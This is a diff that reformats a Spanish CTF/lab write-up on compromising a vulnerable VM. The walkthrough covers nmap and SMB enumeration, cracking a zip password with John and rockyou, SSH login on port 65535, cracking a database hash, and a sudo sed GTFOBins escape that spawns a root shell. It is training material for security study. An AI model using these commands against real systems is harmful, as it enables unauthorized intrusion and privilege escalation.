@@ -3,18 +3,32 @@
 ## ⚙️ Herramientas utilizadas
 ## Reconocimiento
 ### Arp-scan
-```bash sudo arp-scan -I eth0 --localnet ```
-```text 192.168.1.108   08:00:27:60:6a:ed       (Unknown) ```
+```bash 
+sudo arp-scan -I eth0 --localnet
+```
+
+```text 
+192.168.1.108   08:00:27:60:6a:ed       (Unknown)
+```
 - Resultado -> la ip víctima es 192.168.1.108
+
 ### Ping
-```bash ping -c 1 192.168.1.108
-```text PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
+```bash
+ping -c 1 192.168.1.108
+```
+```text
+PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
 64 bytes from 192.168.1.108: icmp_seq=1 ttl=64 time=1.63 ms
+```
 - Resultado -> ttl=64, por lo que es una máquina linux.
 ### Nmap
 Lanzamos un nmap completo para comprobar los puertos abiertos:
+```bash
 nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 192.168.1.108 -oN escaneo.txt
-Resultado -> puerrtos abiertos 139 y 445 (SMB) y 65535:
+```
+- Resultado -> puerrtos abiertos 139 y 445 (SMB) y 65535:
+
+```text
 Nmap scan report for 192.168.1.108
 Host is up, received arp-response (0.00024s latency).
 Scanned at 2025-07-14 17:08:52 CEST for 13s
@@ -59,85 +73,154 @@ Host script results:
 |   Check 3 (port 57010/udp): CLEAN (Failed to receive data)
 |   Check 4 (port 56717/udp): CLEAN (Failed to receive data)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
+```
+
 ### 🚨 ¿Puerto 65535 abierto?
 Esto no es común. El puerto 65535 (el más alto del rango TCP) suele estar cerrado. Si está abierto y no se identifica el servicio (unknown), es muy probable que sea:
 - Un servicio personalizado o camuflado (por ejemplo, un SSH oculto)
+
 ### SMBClient
+```bash
 smbclient -L 192.168.1.108 -N
+```
 Resultado:
+```text
 Sharename       Type      Comment
 ---------       ----      -------
 print$          Disk      Printer Drivers
 backup          Disk      
 IPC$            IPC       IPC Service (Samba Server)
 nobody          Disk      Home Directories
-Probar acceso sin contraseña a los recursos interesantes:
-smbclient //192.168.1.108/nobody -N
-Resultado:
-smbclient //192.168.1.108/nobody -N
+```
 
+Probar acceso sin contraseña a los recursos interesantes:
+```bash
+smbclient //192.168.1.108/nobody -N
+```
+
+Resultado:
+```text
+smbclient //192.168.1.108/nobody -N
 tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
 Ahrora probamos con backup:
+```bash
 smbclient //192.168.1.108/backup -N
 smb: \> ls
   secretito.zip                       N      216  Sun Jul  6 19:02:31 2025
+```
+
 Descargamos secretito.zip:
+```bash
 get secretito.zip
+```
+
 Descomprimimos la carpeta secretito.zip pero nos pide contraseña:
+```text
 unzip secretito.zip
 Archive:  secretito.zip
 [secretito.zip] password password:
-JohnTheRipper
+```
+
+### JohnTheRipper
 Crackeamos la contraseña con JohnTheRipper.
 Sacamos el hash:
+```bash
 zip2john secretito.zip > hash
+```
+```text
 $ cat hash       
 secretito.zip/password:$pkzip$1*2*2*0*22*16*f2e5967a*0*42*0*22*969d*ee16b094213a1612e10c6608d4c2a170383b6b429176dfb6baac253a70a84e202ae7*$/pkzip$:password:secretito.zip::secretito.zip
+```
+
 Le pasamos el rockyou.txt para buscar la contraseña del hash:
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+<img width="610" height="141" alt="image" src="https://github.com/user-attachments/assets/2cab4a37-06c3-4a8d-82ba-3e2c00962304" /><br>
 
 Descomprimimos secretito.zip:
 
+<img width="412" height="134" alt="image" src="https://github.com/user-attachments/assets/7a53eccd-e428-4089-9d86-c37f30b6229b" /><br>
+
 Leemos password:
+```bash
 $ cat password 
 elbunkermolagollon123
-Tenemos una contraseña.
-RPCClient
+```
+- Tenemos una contraseña.
+
+### RPCClient
 Buscamos usuarios:
+```bash
 rpcclient -U "" -N 192.168.1.108
 querydispinfo
+```
 
-Encontramos el usuario cowboy
-Puerto 65535 (SSH)
+<img width="521" height="77" alt="image" src="https://github.com/user-attachments/assets/7520fc4a-94e2-4e54-9493-8bd3e8f3616e" /><br>
+
+Encontramos el usuario cowboy.
+
+### Puerto 65535 (SSH)
 Ahora que tenemos un user y una password probamos a conectarnos al puerto 65535 (ssh):
+```bash
 ssh cowboy@192.168.1.108 -p 65535
+```
 
+<img width="629" height="298" alt="image" src="https://github.com/user-attachments/assets/c69af493-bfd5-45e4-a199-1f4ef0f2678c" /><br>
 
-Escalada de privilegios
+## Escalada de privilegios
 Una vez dentro intentamos conseguir usuario root.
 
-Leemos .bash_history:
+<img width="397" height="107" alt="image" src="https://github.com/user-attachments/assets/888092b3-fd85-4f76-a1a0-63474ad75223" /><br>
+
+- Leemos .bash_history:
+
+<img width="282" height="83" alt="image" src="https://github.com/user-attachments/assets/e0d39d92-03c1-45d6-b5f7-cf9b3f5ab03e" /><br>
+
 
 Hay una BD, nos conectamos:
+```bash
 mariadb -u cowboy -pelbunkermolagollon123
+```
+
+<img width="526" height="534" alt="image" src="https://github.com/user-attachments/assets/1af83f2f-4cbb-49e4-add4-c36a5b6ce33f" /><br>
 
 Está hasheada la contraseña, la crackeamos:
-debian:7c6a180b36896a0a8c02787eeafb0e4c 
-Estamos en CrackStation:
+```bash
+debian:7c6a180b36896a0a8c02787eeafb0e4c
+```
 
-Nos conectamos al usuario debian:
+Entramos en CrackStation:
 
-Comprobamos si podemos ejecutar algún comando como root:
+<img width="689" height="250" alt="image" src="https://github.com/user-attachments/assets/028751b5-41d7-458e-903c-4716375d17f2" /><br>
+
+
+Nos conectamos al usuario debian y comprobamos si podemos ejecutar algún comando como root:
+```bash
 sudo -l
+```
+
+<img width="770" height="83" alt="image" src="https://github.com/user-attachments/assets/0bfbce27-6f77-4c1a-8694-998af818f662" /><br>
+
 
 Buscamos en GTFObins:
 
+
+
 Lanzamos:
+```bash
 sudo sed -n '1e exec sh 1>&0' /etc/hosts
+```
 
-
-Flags
+## Flags
 Flag usuario:
+```bash
 /home/debian/flag.txt
+```
+
 Flag root:
+```bash
 /root/root.txt
+```
